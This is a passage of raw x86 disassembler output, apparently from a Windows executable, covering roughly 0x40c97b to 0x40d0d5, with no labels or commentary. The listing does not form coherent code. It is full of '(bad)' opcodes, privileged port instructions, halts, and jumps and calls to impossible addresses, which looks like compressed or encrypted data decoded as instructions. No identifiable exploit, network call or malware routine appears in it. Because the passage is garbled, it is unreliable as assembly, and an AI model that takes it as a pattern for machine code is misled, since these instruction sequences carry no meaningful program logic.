  40c97b:	xor    ch,BYTE PTR [edi]
  40c97d:	lahf   
  40c97e:	xchg   edx,eax
  40c97f:	and    al,0x4c
  40c981:	loope  0x40c90c
  40c983:	es enter 0x4932,0x2c
  40c988:	mov    edx,eax
  40c98a:	test   BYTE PTR [eax],ch
  40c98c:	dec    edx
  40c98d:	hlt    
  40c98e:	sub    al,0x3c
  40c990:	inc    ebp
  40c991:	enter  0x279e,0xf0
  40c995:	adc    ah,BYTE PTR [ecx-0x78ab0eeb]
  40c99b:	mov    bh,0x7a
  40c99d:	mov    esp,0x3666ef50
  40c9a2:	pop    DWORD PTR [esi-0x1824f507]
  40c9a8:	xchg   esi,eax
  40c9a9:	mov    al,ds:0xf7ceac45
  40c9ae:	pop    esp
  40c9af:	out    0xe1,al
  40c9b1:	adc    bh,bh
  40c9b3:	call   0xe9434b1
  40c9b8:	pop    esi
  40c9b9:	or     bh,al
  40c9bb:	dec    eax
  40c9bc:	pop    eax
  40c9bd:	lods   al,BYTE PTR ds:[esi]
  40c9be:	(bad)  
  40c9bf:	and    edx,ecx
  40c9c1:	xor    ecx,DWORD PTR [ebx]
  40c9c3:	and    esp,DWORD PTR [ecx+0x67]
  40c9c6:	add    al,BYTE PTR [esi-0x76366f1f]
  40c9cc:	mov    bh,BYTE PTR [ebp-0x4e]
  40c9cf:	cmp    al,0x93
  40c9d1:	xchg   ebp,eax
  40c9d2:	xor    ch,BYTE PTR [ebp+0x5632e893]
  40c9d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d9:	sub    eax,0xd6eddf17
  40c9de:	mov    ah,0x9b
  40c9e0:	jb     0x40c9e5
  40c9e2:	or     ah,cl
  40c9e4:	xchg   ebx,eax
  40c9e5:	dec    esi
  40c9e6:	add    eax,0x47fb2316
  40c9eb:	(bad)  
  40c9ec:	pop    ss
  40c9ed:	and    eax,esp
  40c9ef:	mov    bh,0x53
  40c9f1:	mov    ebx,0x9f6f841d
  40c9f6:	adc    edx,edx
  40c9f8:	or     DWORD PTR [esi],esi
  40c9fa:	dec    ecx
  40c9fb:	mov    ds:0x7eb47003,al
  40ca00:	push   ss
  40ca01:	push   cs
  40ca02:	mov    ecx,0x5e0db978
  40ca07:	test   eax,0xc3339f0
  40ca0c:	sar    BYTE PTR [ecx+0x76],0xb3
  40ca10:	sahf   
  40ca11:	popa   
  40ca12:	or     dl,dl
  40ca14:	icebp  
  40ca15:	or     al,0xa4
  40ca17:	mov    eax,ds:0x21144e83
  40ca1c:	xchg   esi,eax
  40ca1d:	call   0x450c84ef
  40ca22:	in     al,dx
  40ca23:	lods   eax,DWORD PTR ds:[esi]
  40ca24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca25:	and    al,BYTE PTR [edx]
  40ca27:	iret   
  40ca28:	push   ebx
  40ca29:	adc    ecx,DWORD PTR [edi-0x70]
  40ca2c:	xchg   BYTE PTR [eax-0x2c],cl
  40ca2f:	add    BYTE PTR [edi-0x840e31c],cl
  40ca35:	fxch   st(3)
  40ca37:	mov    WORD PTR [ebp-0x360c903],cs
  40ca3d:	xchg   ecx,eax
  40ca3e:	out    dx,eax
  40ca3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca40:	push   esi
  40ca41:	stos   DWORD PTR es:[edi],eax
  40ca42:	shr    DWORD PTR [esi-0x49],1
  40ca45:	ins    DWORD PTR es:[edi],dx
  40ca46:	xor    dl,dh
  40ca48:	mov    ds:0x4a13b8c1,al
  40ca4d:	enter  0xedff,0x14
  40ca51:	or     al,0x14
  40ca53:	xchg   BYTE PTR [ecx],ah
  40ca55:	inc    ecx
  40ca56:	adc    BYTE PTR [eax],dh
  40ca58:	xor    esi,DWORD PTR [ebx]
  40ca5a:	ret    
  40ca5b:	outs   dx,DWORD PTR ds:[esi]
  40ca5c:	(bad)  
  40ca5d:	out    dx,al
  40ca5e:	jecxz  0x40cadc
  40ca60:	loope  0x40ca2d
  40ca62:	push   edi
  40ca63:	sbb    dh,al
  40ca65:	or     ecx,DWORD PTR [eax+0x29a80c60]
  40ca6b:	sbb    WORD PTR [ebx+0x3d],cx
  40ca6f:	sbb    eax,0x8589263a
  40ca74:	jb     0x40ca0b
  40ca76:	jns    0x40ca5e
  40ca78:	fisubr DWORD PTR [edx]
  40ca7a:	cmp    eax,0xf630feba
  40ca7f:	pop    ebp
  40ca80:	cmp    al,0x83
  40ca82:	jo     0x40ca08
  40ca84:	imul   ebx,esp,0x23
  40ca87:	or     esi,ebp
  40ca89:	cmc    
  40ca8a:	jbe    0x40ca25
  40ca8c:	test   eax,0x5d09aecb
  40ca91:	sbb    al,BYTE PTR [esi-0x58b41a0]
  40ca97:	in     eax,dx
  40ca98:	mov    bl,0xf8
  40ca9a:	rol    DWORD PTR [ecx+0x1],0x90
  40ca9e:	popa   
  40ca9f:	add    bl,BYTE PTR [ecx]
  40caa1:	add    BYTE PTR [edx-0x30],dl
  40caa4:	xchg   esp,eax
  40caa5:	adc    DWORD PTR [eax+0x33],edx
  40caa8:	inc    esp
  40caa9:	sbb    eax,0x31c49007
  40caae:	sub    DWORD PTR [edi],0xc801ebaf
  40cab4:	sbb    BYTE PTR [edx-0x310d124d],ah
  40caba:	ja     0x40cab8
  40cabc:	(bad)  
  40cabd:	mov    bh,0x9b
  40cabf:	or     BYTE PTR [edx+edx*1],al
  40cac2:	ss das 
  40cac4:	mov    ebp,0x455bd3fa
  40cac9:	stos   BYTE PTR es:[edi],al
  40caca:	neg    DWORD PTR [ebx-0x6afe041a]
  40cad0:	dec    edx
  40cad1:	add    eax,0xa53bf9d3
  40cad6:	add    eax,0x7565d9bb
  40cadb:	(bad)  
  40cadd:	adc    edi,DWORD PTR [esi-0x3e3c0e25]
  40cae3:	add    BYTE PTR [ebx+ebx*4+0x91553c0],al
  40caea:	or     eax,0x966721a3
  40caef:	pop    ebx
  40caf0:	dec    eax
  40caf1:	mul    al
  40caf3:	data16 int3 
  40caf5:	xchg   ebp,eax
  40caf6:	sub    BYTE PTR [edx],ah
  40caf8:	dec    esi
  40caf9:	jb     0x40cb0e
  40cafb:	sbb    esi,DWORD PTR [ebx-0x77a60bc]
  40cb01:	sbb    DWORD PTR [edi-0x6faab9a0],edx
  40cb07:	mov    cs,WORD PTR ds:0x62237520
  40cb0d:	jle    0x40cb60
  40cb0f:	(bad)  
  40cb10:	and    eax,0xe867a449
  40cb15:	jmp    0xe8755435
  40cb1a:	sub    BYTE PTR [ebx],ch
  40cb1c:	sahf   
  40cb1d:	add    al,0x61
  40cb1f:	xor    cl,bh
  40cb21:	outs   dx,DWORD PTR ds:[esi]
  40cb22:	cld    
  40cb23:	mul    BYTE PTR ds:0xc7bf9ac6
  40cb29:	(bad)  
  40cb2b:	mov    ebx,0x3870c1df
  40cb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb31:	fucomi st,st(5)
  40cb33:	jmp    0xfde9:0x140a
  40cb39:	cmp    ecx,DWORD PTR [ecx-0x8]
  40cb3c:	popf   
  40cb3d:	sbb    BYTE PTR [edx+0x60c1bf9],al
  40cb43:	sub    al,0x2e
  40cb45:	cs jb  0x40cb29
  40cb48:	ret    0xbf1a
  40cb4b:	stc    
  40cb4c:	cmp    ecx,edi
  40cb4e:	mov    cl,0xd9
  40cb50:	push   ds
  40cb51:	add    ebp,DWORD PTR [edi+0xc]
  40cb54:	inc    esp
  40cb55:	pop    ebp
  40cb56:	aad    0x4c
  40cb58:	nop
  40cb59:	mov    DWORD PTR [esi-0x3c6646c],esi
  40cb5f:	retf   0xe810
  40cb62:	add    DWORD PTR [esi-0xbb43fd1],ebx
  40cb68:	sub    esp,DWORD PTR [ebp+eiz*1-0x50]
  40cb6c:	and    al,0x3f
  40cb6e:	pop    ss
  40cb6f:	pop    eax
  40cb70:	xor    DWORD PTR [ebx-0x4b451ec],edi
  40cb76:	out    dx,al
  40cb77:	sahf   
  40cb78:	enter  0x671d,0x2d
  40cb7c:	jmp    FWORD PTR [esi]
  40cb7e:	cld    
  40cb7f:	aaa    
  40cb80:	div    DWORD PTR [eax+0x5d]
  40cb83:	xchg   DWORD PTR [esi],ecx
  40cb85:	arpl   WORD PTR [eax],si
  40cb87:	mov    BYTE PTR [ecx-0x5a],al
  40cb8a:	xlat   BYTE PTR ds:[ebx]
  40cb8b:	mov    cl,0x53
  40cb8d:	mov    edi,0x750d7b85
  40cb92:	sahf   
  40cb93:	sbb    al,BYTE PTR [edi]
  40cb95:	(bad)  
  40cb96:	or     BYTE PTR [eax+0x2258a2fe],ch
  40cb9c:	inc    esp
  40cb9d:	inc    edx
  40cb9e:	mov    ebp,0xc5c51312
  40cba3:	leave  
  40cba4:	pop    ebx
  40cba5:	add    BYTE PTR [ebx-0x248a34df],bl
  40cbab:	cmp    ch,ch
  40cbad:	iret   
  40cbae:	add    dl,BYTE PTR ds:[eax+0xc]
  40cbb2:	shl    BYTE PTR [edi+0x12],0x7f
  40cbb6:	and    BYTE PTR [edx+0xc],0x9e
  40cbba:	xchg   BYTE PTR [edx-0x5867a2da],dh
  40cbc0:	retf   
  40cbc1:	sub    DWORD PTR [ecx-0x2f3cf1e9],0xffffffce
  40cbc8:	dec    edx
  40cbc9:	xor    ecx,DWORD PTR [esp]
  40cbcc:	scas   eax,DWORD PTR es:[edi]
  40cbcd:	add    ch,ah
  40cbcf:	sbb    WORD PTR [esi-0x72],bp
  40cbd3:	lock pop ebp
  40cbd5:	sub    esi,DWORD PTR [esi-0x76d9fe8f]
  40cbdb:	repnz dec ebx
  40cbdd:	(bad)  
  40cbde:	jno    0x40cc2c
  40cbe0:	test   eax,0x7b7b665c
  40cbe5:	fwait
  40cbe6:	or     edx,DWORD PTR [edi]
  40cbe8:	xchg   DWORD PTR [edx-0x779dad75],edi
  40cbee:	mov    ds:0xf04c3084,al
  40cbf3:	add    eax,ebp
  40cbf5:	cld    
  40cbf6:	push   edx
  40cbf7:	sbb    bl,BYTE PTR [esi*8-0x30fdd40d]
  40cbfe:	mov    BYTE PTR ds:0x51819964,0xd
  40cc05:	sbb    al,0xe9
  40cc07:	imul   ecx,DWORD PTR [edi-0x376e298b],0x38
  40cc0e:	ret    0xd6ce
  40cc11:	add    edx,edx
  40cc13:	or     bh,BYTE PTR ds:0x69bf0e66
  40cc19:	push   ds
  40cc1a:	std    
  40cc1b:	jo     0x40cb9e
  40cc1d:	pop    edi
  40cc1e:	clc    
  40cc1f:	aad    0x65
  40cc21:	addr16 mov si,0xf7c0
  40cc26:	jg     0x40cc0a
  40cc28:	popf   
  40cc29:	or     al,0x6
  40cc2b:	add    eax,DWORD PTR [esi]
  40cc2d:	add    ecx,0x8
  40cc30:	adc    ecx,eax
  40cc32:	xor    eax,DWORD PTR [edx+0x2bbf9f22]
  40cc38:	stc    
  40cc39:	repz jns 0x40cc3c
  40cc3c:	jp     0x40cbfb
  40cc3e:	push   ds
  40cc3f:	adc    edx,DWORD PTR [ebx]
  40cc41:	adc    edx,esp
  40cc43:	jmp    0x40cc92
  40cc45:	inc    bl
  40cc47:	das    
  40cc48:	cld    
  40cc49:	and    DWORD PTR [edi-0x71],eax
  40cc4c:	cmovs  esp,esp
  40cc4f:	or     al,0x88
  40cc51:	mov    BYTE PTR es:[edx-0x6f6db946],dl
  40cc58:	inc    esp
  40cc59:	xor    DWORD PTR [ecx-0x14],edx
  40cc5c:	sub    edx,DWORD PTR ds:0x23888a20
  40cc62:	mov    eax,ds:0x41492172
  40cc67:	bound  esi,QWORD PTR [ebp+0x60]
  40cc6a:	inc    ebx
  40cc6b:	lods   al,BYTE PTR ds:[esi]
  40cc6c:	pop    edx
  40cc6d:	dec    edx
  40cc6e:	jp     0x40cc00
  40cc70:	push   ebp
  40cc71:	or     esi,DWORD PTR [eax-0x78]
  40cc74:	lds    edx,FWORD PTR ds:0xcbc482cd
  40cc7a:	push   ds
  40cc7b:	rol    DWORD PTR [bp+si+0x66],1
  40cc7f:	sbb    ebp,ecx
  40cc81:	xor    eax,0xf74fdc2c
  40cc86:	jns    0x40cc51
  40cc88:	test   al,0xb8
  40cc8a:	pop    ss
  40cc8b:	outs   dx,BYTE PTR ds:[esi]
  40cc8c:	inc    esi
  40cc8d:	loop   0x40cc5b
  40cc8f:	fstp   QWORD PTR ds:[edi]
  40cc92:	ror    BYTE PTR ds:0x23884e03,cl
  40cc98:	lock cmp eax,0x112f1898
  40cc9e:	(bad)  
  40cc9f:	jb     0x40cc25
  40cca1:	add    DWORD PTR [eax-0x3b56ad0b],ebx
  40cca7:	(bad)  
  40cca8:	(bad)  
  40cca9:	xchg   esi,eax
  40ccaa:	int    0xe6
  40ccac:	in     al,dx
  40ccad:	cmp    al,0x5b
  40ccaf:	enter  0x746d,0x1
  40ccb3:	ret    0x864d
  40ccb6:	add    bh,BYTE PTR [ebx-0x62]
  40ccb9:	aas    
  40ccba:	inc    edx
  40ccbb:	dec    esp
  40ccbc:	jp     0x40cc4d
  40ccbe:	out    0xba,al
  40ccc0:	scas   al,BYTE PTR es:[edi]
  40ccc1:	jp     0x40cc63
  40ccc3:	xchg   BYTE PTR ds:[ebx-0x22472f04],bl
  40ccca:	pop    esp
  40cccb:	cmp    eax,edx
  40cccd:	cmc    
  40ccce:	lods   al,BYTE PTR ds:[esi]
  40cccf:	cmc    
  40ccd0:	xlat   BYTE PTR ds:[ebx]
  40ccd1:	pop    ebx
  40ccd2:	jbe    0x40cc73
  40ccd4:	(bad)
  40ccd7:	lods   eax,DWORD PTR ds:[esi]
  40ccd8:	cmc    
  40ccd9:	dec    eax
  40ccda:	aas    
  40ccdb:	xchg   ebx,eax
  40ccdc:	les    ecx,FWORD PTR [ecx-0x14]
  40ccdf:	mov    eax,ds:0x575700a3
  40cce4:	aaa    
  40cce5:	imul   esi,DWORD PTR [ebp-0x7b10cb43],0x5e1ec1d4
  40ccef:	dec    esp
  40ccf0:	sub    esi,esi
  40ccf2:	hlt    
  40ccf3:	add    BYTE PTR ds:0xcdfd23f7,dh
  40ccf9:	shr    DWORD PTR [ebx+ecx*2+0x53],0x96
  40ccfe:	call   0x456630d5
  40cd03:	mov    al,0xdf
  40cd05:	adc    BYTE PTR [esi-0x4a322af5],bh
  40cd0b:	push   ebp
  40cd0c:	xor    DWORD PTR [ecx],edx
  40cd0e:	cmp    edi,DWORD PTR [edi+0x46]
  40cd11:	es fs mov dl,0xf9
  40cd15:	(bad)  
  40cd17:	rcr    DWORD PTR [ecx],cl
  40cd19:	in     al,dx
  40cd1a:	in     eax,0x5f
  40cd1c:	(bad)  
  40cd1d:	fcom   QWORD PTR [ecx+0x66]
  40cd20:	data16 (bad) 
  40cd22:	js     0x40cd03
  40cd24:	mov    bh,0xbd
  40cd26:	sahf   
  40cd27:	jae    0x40cd10
  40cd29:	into   
  40cd2a:	xor    DWORD PTR [eax],ebx
  40cd2c:	or     al,0x32
  40cd2e:	dec    ecx
  40cd2f:	pop    edx
  40cd30:	ja     0x40cd64
  40cd32:	cli    
  40cd33:	in     eax,0x89
  40cd35:	mov    esi,0xc37cd968
  40cd3a:	jge    0x40cd37
  40cd3c:	div    cl
  40cd3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd3f:	(bad)  
  40cd40:	mov    ebp,0xdbfe67c8
  40cd45:	imul   eax,DWORD PTR [esi],0xfd251ed1
  40cd4b:	test   eax,0x44914ca4
  40cd50:	mov    eax,ds:0x8e263880
  40cd55:	cmp    eax,0xbcf127fd
  40cd5a:	add    al,0x89
  40cd5c:	xchg   DWORD PTR [edi-0x70e639dc],edx
  40cd62:	popa   
  40cd63:	add    al,BYTE PTR [edx]
  40cd65:	mov    eax,ds:0x9a597672
  40cd6a:	push   esp
  40cd6b:	adc    DWORD PTR [edi-0x57],edi
  40cd6e:	sbb    ecx,esi
  40cd70:	sbb    eax,0x6801d263
  40cd75:	imul   ebx,DWORD PTR [edi-0x5aad541b],0x1ce39ddb
  40cd7f:	inc    esi
  40cd80:	and    BYTE PTR [ebx],dh
  40cd82:	test   BYTE PTR ds:0xe9636e3d,0xd0
  40cd89:	mov    ebp,0x55a876ab
  40cd8e:	push   ebp
  40cd8f:	adc    eax,0x8901274a
  40cd94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd95:	bound  eax,QWORD PTR [eax]
  40cd97:	les    edx,FWORD PTR [esp+edi*2+0x18d02b35]
  40cd9e:	sti    
  40cd9f:	fdivr  st(1),st
  40cda1:	addr16 mov ds:0x8b4c,eax
  40cda5:	cmp    eax,0x536e0362
  40cdaa:	and    dl,BYTE PTR [eax]
  40cdac:	shl    DWORD PTR [esi-0x73],cl
  40cdaf:	add    BYTE PTR [esp+eiz*8-0x4d53f32],cl
  40cdb6:	fwait
  40cdb7:	mov    bh,0x1
  40cdb9:	js     0x40cdd4
  40cdbb:	aad    0x60
  40cdbd:	daa    
  40cdbe:	clc    
  40cdbf:	or     DWORD PTR [eax],edi
  40cdc1:	sub    al,ch
  40cdc3:	mov    ch,0xb3
  40cdc5:	xchg   esp,eax
  40cdc6:	in     eax,dx
  40cdc7:	les    eax,FWORD PTR [esi+ebp*2]
  40cdca:	fs lahf 
  40cdcc:	jns    0x40cdfc
  40cdce:	jae    0x40cd8f
  40cdd0:	mov    eax,ds:0x96a4d3d6
  40cdd5:	(bad)  
  40cdd6:	adc    dh,ch
  40cdd8:	sub    DWORD PTR [edx],0x2f673295
  40cdde:	pop    esp
  40cddf:	mov    bx,0xd815
  40cde3:	xlat   BYTE PTR ds:[ebx]
  40cde4:	push   ebx
  40cde5:	(bad)
  40cde9:	xor    dl,dl
  40cdeb:	iret   
  40cdec:	sbb    eax,0xb81e938
  40cdf1:	or     BYTE PTR [edi+eiz*8],bl
  40cdf4:	pop    ebp
  40cdf5:	xor    eax,DWORD PTR [esi+ecx*2]
  40cdf8:	jbe    0x40cdb5
  40cdfa:	cmp    DWORD PTR [esi],edi
  40cdfc:	mov    ch,0x21
  40cdfe:	in     al,dx
  40cdff:	mov    al,0x5d
  40ce01:	dec    edx
  40ce02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce03:	sbb    eax,edi
  40ce05:	rol    BYTE PTR [eax-0x23],cl
  40ce08:	add    al,0x64
  40ce0a:	adc    DWORD PTR [edx],edx
  40ce0c:	sub    BYTE PTR [ecx+0x47e05ad1],dh
  40ce12:	jg     0x40ce10
  40ce14:	dec    edi
  40ce15:	cdq    
  40ce16:	sahf   
  40ce17:	outs   dx,BYTE PTR ds:[esi]
  40ce18:	repnz cli 
  40ce1a:	pop    es
  40ce1b:	out    dx,al
  40ce1c:	in     al,0xd4
  40ce1e:	test   eax,0x38990053
  40ce23:	hlt    
  40ce24:	and    dl,BYTE PTR ds:0x40cc7ae0
  40ce2a:	dec    edx
  40ce2b:	xor    eax,0x81c0e08f
  40ce30:	add    esi,esp
  40ce32:	jp     0x40ce45
  40ce34:	mov    edi,0x738f1bf2
  40ce39:	jmp    0x8e29e788
  40ce3e:	adc    edi,0x0
  40ce41:	add    dh,ch
  40ce43:	cmp    al,0x52
  40ce45:	fdiv   DWORD PTR [edx+ebx*2]
  40ce48:	stos   BYTE PTR es:[edi],al
  40ce49:	js     0x40cdf1
  40ce4b:	repnz push ss
  40ce4d:	les    ecx,FWORD PTR [ecx+0x2291a78f]
  40ce53:	sahf   
  40ce54:	cmp    BYTE PTR [eax],0x25
  40ce57:	cmp    ch,bl
  40ce59:	adc    eax,0xfba7efb4
  40ce5e:	push   edi
  40ce5f:	dec    eax
  40ce60:	dec    ebp
  40ce61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce62:	out    0x1d,al
  40ce64:	sar    DWORD PTR [eax-0x7a],cl
  40ce67:	xor    al,0x69
  40ce69:	xchg   DWORD PTR [ebx-0x6a4e8bdc],eax
  40ce6f:	sub    al,0x5a
  40ce71:	xor    BYTE PTR [edi-0x12d14cd],dl
  40ce77:	or     dl,BYTE PTR [ebx+0x1061c82a]
  40ce7d:	inc    edx
  40ce7e:	or     BYTE PTR [edx],dh
  40ce80:	jne    0x40ce8b
  40ce82:	repnz push 0xffffff80
  40ce85:	push   esp
  40ce86:	cmc    
  40ce87:	add    BYTE PTR [ebx+0x1467bd44],dl
  40ce8d:	sub    DWORD PTR [edi],0x22
  40ce90:	xchg   edx,eax
  40ce91:	and    al,0x24
  40ce93:	mov    ?,WORD PTR [edx+0x78ee6581]
  40ce99:	hlt    
  40ce9a:	cmp    al,0xcf
  40ce9c:	(bad)  
  40ce9d:	pop    esp
  40ce9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce9f:	iret   
  40cea0:	and    eax,0x2d02ae00
  40cea5:	outs   dx,BYTE PTR ds:[esi]
  40cea6:	arpl   WORD PTR [ebx-0x5f5ffb97],di
  40ceac:	mov    ebp,0xdf78219f
  40ceb1:	aaa    
  40ceb2:	nop
  40ceb3:	lea    ecx,ds:[ebx]
  40ceb6:	xor    BYTE PTR [eax+ebx*2+0x2d1d049],bl
  40cebd:	adc    al,BYTE PTR [esi]
  40cebf:	(bad)  
  40cec0:	fwait
  40cec1:	rcr    DWORD PTR [eax-0x6faf6fd1],0x2d
  40cec8:	gs push edi
  40ceca:	dec    esp
  40cecb:	sar    BYTE PTR ds:0x1c2dbf2f,0xc
  40ced2:	mov    dl,0xbe
  40ced4:	outs   dx,BYTE PTR ds:[esi]
  40ced5:	popa   
  40ced6:	push   0x1
  40ced8:	xchg   esp,eax
  40ced9:	cmp    BYTE PTR [ebx-0x1a],dh
  40cedc:	sub    ah,BYTE PTR [ecx+0x37]
  40cedf:	mov    al,0x1e
  40cee1:	add    BYTE PTR [eax+0x5b],al
  40cee4:	jl     0x40cef9
  40cee6:	cmp    al,0x2f
  40cee8:	inc    esi
  40cee9:	es xchg edx,eax
  40ceeb:	xchg   edx,eax
  40ceec:	xchg   esp,eax
  40ceed:	js     0x40cf30
  40ceef:	or     cl,bl
  40cef1:	mov    bl,0x44
  40cef3:	dec    edi
  40cef4:	data16 add BYTE PTR [eax*1+0x7a2277db],ah
  40cefc:	jae    0x40cead
  40cefe:	mov    ds:0xee752965,al
  40cf03:	add    BYTE PTR [edi-0x5fd64218],dh
  40cf09:	and    DWORD PTR [ebp-0x77],ebx
  40cf0c:	add    eax,0xd5d2e650
  40cf11:	pop    ecx
  40cf12:	dec    BYTE PTR [edi+0x7e39f67f]
  40cf18:	out    0xa7,al
  40cf1a:	ds enter 0xe2e2,0x22
  40cf1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf20:	dec    edi
  40cf21:	lahf   
  40cf22:	mov    dh,0x36
  40cf24:	pushf  
  40cf25:	and    ah,BYTE PTR [ebx]
  40cf27:	lahf   
  40cf28:	xchg   ecx,eax
  40cf29:	pop    edx
  40cf2a:	xlat   BYTE PTR ds:[ebx]
  40cf2b:	bound  ecx,QWORD PTR [edi*8-0x42856082]
  40cf32:	into   
  40cf33:	cld    
  40cf34:	cld    
  40cf35:	cmp    al,0xbf
  40cf37:	clc    
  40cf38:	lahf   
  40cf39:	mov    esi,0x6f4f13c8
  40cf3e:	xchg   ebx,eax
  40cf3f:	mov    BYTE PTR ds:0x54cdfd0d,al
  40cf45:	jno    0x40ced0
  40cf47:	dec    esp
  40cf48:	bound  esp,QWORD PTR [esp+ecx*1-0x77]
  40cf4c:	hlt    
  40cf4d:	dec    eax
  40cf4e:	loop   0x40cf98
  40cf50:	gs int3 
  40cf52:	mov    DWORD PTR [edx-0x1e],esp
  40cf55:	sub    dl,al
  40cf57:	test   DWORD PTR [edx],0x802654a4
  40cf5d:	in     al,dx
  40cf5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf5f:	fwait
  40cf60:	sub    al,0x40
  40cf63:	and    ebx,DWORD PTR [eax+0x4]
  40cf66:	mov    al,ds:0xbf694c27
  40cf6b:	push   0x50605aa1
  40cf70:	mov    esi,0xb5e909e2
  40cf75:	mov    ch,0x88
  40cf77:	and    dl,bh
  40cf79:	dec    ecx
  40cf7a:	call   0x947d:0x22e8385f
  40cf81:	retf   0x545a
  40cf84:	mov    esp,0x200000
  40cf89:	dec    ecx
  40cf8a:	inc    esp
  40cf8b:	inc    ecx
  40cf8c:	push   esp
  40cf8d:	sbb    al,0x53
  40cf8f:	lds    edi,FWORD PTR [ecx]
  40cf91:	aaa    
  40cf92:	int    0x39
  40cf94:	sbb    ch,al
  40cf96:	inc    edx
  40cf97:	and    eax,0x8d258904
  40cf9c:	pop    edx
  40cf9d:	lahf   
  40cf9e:	mov    DWORD PTR [ecx+0xd817132],esi
  40cfa4:	shl    BYTE PTR [ebp-0x5c],0x3b
  40cfa8:	mov    eax,0x7d024f00
  40cfad:	outs   dx,BYTE PTR ds:[esi]
  40cfae:	arpl   bx,bx
  40cfb0:	push   ebp
  40cfb1:	ins    DWORD PTR es:[edi],dx
  40cfb2:	inc    eax
  40cfb3:	and    eax,edx
  40cfb5:	mov    edx,0x1801b1bd
  40cfba:	imul   esp,DWORD PTR [esi+0x210f74e9],0x1c
  40cfc1:	into   
  40cfc2:	in     al,dx
  40cfc3:	cld    
  40cfc4:	dec    ecx
  40cfc5:	cdq    
  40cfc6:	pop    edx
  40cfc7:	inc    esi
  40cfc8:	ja     0x40cffc
  40cfca:	mov    es,WORD PTR [eax+0x36]
  40cfcd:	push   edx
  40cfce:	or     eax,0xf20bd8c8
  40cfd3:	xlat   BYTE PTR ds:[ebx]
  40cfd4:	xor    eax,edi
  40cfd6:	in     eax,dx
  40cfd7:	push   esi
  40cfd8:	test   DWORD PTR [edi],0x83063835
  40cfde:	add    DWORD PTR [eax-0x6b],ecx
  40cfe1:	adc    al,0xd2
  40cfe3:	pusha  
  40cfe4:	sbb    cl,BYTE PTR [edi+0x8]
  40cfe7:	jl     0x40d048
  40cfe9:	jo     0x40cfe1
  40cfeb:	fsub   QWORD PTR [esi]
  40cfed:	sub    dl,BYTE PTR [ecx]
  40cfef:	push   0x24b1c5b6
  40cff4:	or     al,0x63
  40cff6:	sub    BYTE PTR [ecx],al
  40cff8:	adc    DWORD PTR [esp-0x15eb85aa],edx
  40cfff:	imul   dl
  40d001:	pop    edi
  40d002:	xchg   al,ch
  40d004:	in     eax,dx
  40d005:	mov    cl,0xe4
  40d007:	mov    bh,0x39
  40d009:	sti    
  40d00a:	jbe    0x40d04e
  40d00c:	pop    es
  40d00d:	push   es
  40d00e:	dec    ebp
  40d00f:	cmp    dh,bh
  40d011:	outs   dx,BYTE PTR ds:[esi]
  40d012:	xor    eax,0x4c3a5a6
  40d017:	rcl    ah,cl
  40d019:	ins    BYTE PTR es:[edi],dx
  40d01a:	mov    BYTE PTR [edx],bl
  40d01c:	daa    
  40d01d:	xchg   esi,eax
  40d01e:	daa    
  40d01f:	stc    
  40d020:	pop    es
  40d021:	lahf   
  40d022:	cld    
  40d023:	add    edi,esi
  40d025:	in     eax,dx
  40d026:	(bad)  
  40d027:	stc    
  40d028:	popa   
  40d029:	push   ss
  40d02a:	pop    ss
  40d02b:	pop    ss
  40d02c:	cmp    DWORD PTR [ebx-0x1a],esi
  40d02f:	or     al,0xa5
  40d031:	push   edx
  40d032:	leave  
  40d033:	adc    bh,BYTE PTR [ebx-0x37745147]
  40d039:	repnz fisttp DWORD PTR [ebp+0x3f]
  40d03d:	fwait
  40d03e:	cmp    al,BYTE PTR [ebp-0x1ee371b9]
  40d044:	clc    
  40d045:	dec    ebx
  40d046:	out    0xf9,eax
  40d048:	lods   eax,DWORD PTR ds:[esi]
  40d049:	fistp  QWORD PTR ds:0xae3fbb46
  40d04f:	xor    esp,DWORD PTR [esi]
  40d051:	push   ebp
  40d052:	pushf  
  40d053:	(bad)  
  40d055:	dec    ebx
  40d056:	mov    DWORD PTR [edx+0x47b1c45f],esi
  40d05c:	adc    al,0xc5
  40d05e:	inc    esp
  40d05f:	mov    DWORD PTR [eax],esp
  40d061:	mov    ah,BYTE PTR [edx+0x3c]
  40d064:	(bad)  
  40d066:	dec    edi
  40d067:	and    BYTE PTR ds:0xfd7c88df,bh
  40d06d:	ins    DWORD PTR es:[edi],dx
  40d06e:	int    0xf9
  40d070:	jns    0x40d05b
  40d072:	call   0xe075d519
  40d077:	mov    dl,0x99
  40d079:	jle    0x40d0d8
  40d07b:	push   es
  40d07c:	nop
  40d07d:	inc    edx
  40d07e:	jnp    0x40d07d
  40d080:	and    BYTE PTR ss:[edx+edi*8+0x11bb7681],bl
  40d088:	ss stc 
  40d08a:	jnp    0x40d032
  40d08c:	or     al,0x43
  40d08e:	mov    ecx,0x8e5af515
  40d093:	outs   dx,DWORD PTR ds:[esi]
  40d094:	pop    eax
  40d095:	sbb    eax,DWORD PTR [eax+0x22]
  40d098:	or     ebx,esp
  40d09a:	test   BYTE PTR [eax],bh
  40d09c:	xchg   BYTE PTR [eax],ah
  40d09e:	sbb    dl,dl
  40d0a0:	push   0x76644834
  40d0a5:	and    dl,BYTE PTR [eax-0x30c2d7d5]
  40d0ab:	mov    ds:0x1917efdf,eax
  40d0b0:	add    bh,cl
  40d0b2:	jl     0x40d0a3
  40d0b4:	idiv   DWORD PTR [esi-0x11]
  40d0b7:	into   
  40d0b8:	les    esi,FWORD PTR [ecx+0xb]
  40d0bb:	fisubr DWORD PTR [esi-0x4e]
  40d0be:	add    dl,BYTE PTR [edi+0x6ad494a5]
  40d0c4:	or     eax,0x8652a54a
  40d0c9:	test   al,0x5c
  40d0cb:	or     ebx,0xffffffc8
  40d0ce:	(bad)  
  40d0cf:	xor    bh,BYTE PTR [ebx-0x7c]
  40d0d2:	sbb    eax,DWORD PTR [ebx+edx*4]
  40d0d5:	test   DWORD PTR [esi-0x1a],eax
